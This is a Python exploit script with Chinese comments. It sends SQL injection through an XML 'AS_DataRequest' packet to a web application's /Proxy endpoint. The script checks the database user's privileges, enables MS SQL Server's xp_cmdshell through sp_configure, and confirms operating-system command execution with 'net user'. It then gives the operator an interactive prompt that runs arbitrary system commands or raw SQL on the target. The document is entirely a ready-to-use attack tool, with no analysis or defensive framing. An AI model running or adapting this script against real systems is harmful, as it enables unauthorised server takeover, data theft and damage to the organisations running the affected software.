# -*- coding: utf-8 -*-  
__Author__="p4ssw0rd"
import requests
import sys
import urllib3
import re
from html.parser import HTMLParser

urllib3.disable_warnings()
session = requests.session()
url="http://127.0.0.1/"
headers = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (compatible; MSIE 6.0;)", "Connection": "Keep-Alive", "Cache-Control": "no-cache"}
payloadCheck_xp_cmdshell="select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell';"
payloadOpen_xp_cmdshell="exec sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure'xp_cmdshell', 1;RECONFIGURE;"
payloadCheck_privilage="select user;"
payloadGetNetUser="exec master..xp_cmdshell 'net user';"
payloadStatus_xp_cmdshell=r"select *  from master..sysconfigures where comment like '%show advanced options%' or  comment like '%xp_cmdshell%';"
global CommandExecution

# 数据处理
def dataHandler(payload):
    data = {"cVer": "9.8.0", "dp": "<?xml version=\"1.0\" encoding=\"GB2312\"?><R9PACKET version=\"1\"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format=\"text\">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format=\"text\">%s</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>"% payload} 
    return HTMLParser().unescape(session.post(url, headers=headers, data=data,verify=False,).content.decode("utf8","ignore"))


# 判断当前用户权限
def Check_privilage():
    content = dataHandler(payloadCheck_privilage)
    privilages = re.findall('<ROW COLUMN1=\"([^ ]+)\" />',content)
    if len(privilages)==0:
        userDefinePayload()
    elif privilages[0]=="dbo":
        print("[+]恭喜,当前权限为dbo")
    else:
        print("[+]当前权限为%s" % privilages[0])
# 判断xp_cmdshell是否禁用
def Check_xp_cmdshell():
    if '<ROW COLUMN1="1" />' in dataHandler(payloadCheck_xp_cmdshell):
        print("[+]xp_cmdshell已安装.")
    else:
        print("[-]xp_cmdshell未安装.")
        userDefinePayload()
# 判断xp_cmdshell是否开启
def Status_xp_cmdshell():
    content = dataHandler(payloadStatus_xp_cmdshell)
    status = re.findall("<ROW value=\"(\d+)\" config",content)
    if len(status)==0:
        userDefinePayload()
    elif status[0] == "0":
        Open_xp_cmdshell()
        print("[+]xp_cmdshell未开启,已尝试开启")
    elif status[0] == "1":
        print("[+]xp_cmdshell已开启.")
    else:
        userDefinePayload()
# 开启xp_cmdshell
def Open_xp_cmdshell():
    _ = dataHandler(payloadOpen_xp_cmdshell)
# 判断命令是否执行成功
def Get_net_user():
    if "Administrator" in dataHandler(payloadGetNetUser):
        global CommandExecution
        CommandExecution = True
        print("[+]xp_cmdshell启用成功,可执行系统命令")
    else:
        CommandExecution=False
        print( "[-]xp_cmdshell启用失败,请尝试其他方式")
        userDefinePayload()
# 执行命令
def PUSH_Command(command):
    return dataHandler("exec master..xp_cmdshell '%s';" % command)  
def Get_CommandResult(command):
    content = PUSH_Command(command)
    results = re.findall("<ROWDATA>(.*?)</ROWDATA>",content)
    if len(results)==0:
        print("[-]执行命令失败，请手工验证")
        userDefinePayload()
    else:
        result = re.findall('<ROW output=\"(.*?)\" />',results[0])
        for i in result:
            print(i) 
# 出现错误时自定义payload
def userDefinePayload():
    print("[*]请输入sql语句,输入exit()退出")
    sql = input(">")
    while sql!="exit()":
        print(dataHandler(sql)) 
        sql = input(">")
    exit(0)
def urlHandle(url):
    while url[-1]=="/":
        url = url[:-1]
    return url+"/Proxy"
if __name__ == "__main__":
    if len(sys.argv)<2:
        print("[*]usage : python3 %s http://127.0.0.1/" % __file__)
    else:
        url = urlHandle(sys.argv[1])
        Check_privilage()
        Check_xp_cmdshell()
        Status_xp_cmdshell()
        Get_net_user()
        print("[*]正在尝试使用xp_cmdshell命令执行")        
        CommandExecution
        if CommandExecution == True:
            print("[*]请输入命令,输入exit()退出")
            command = input(">")
            while command!="exit()":
                Get_CommandResult(command)
                command = input(">")
            exit(0)
        else:
            print("[-]失败")
            userDefinePayload()
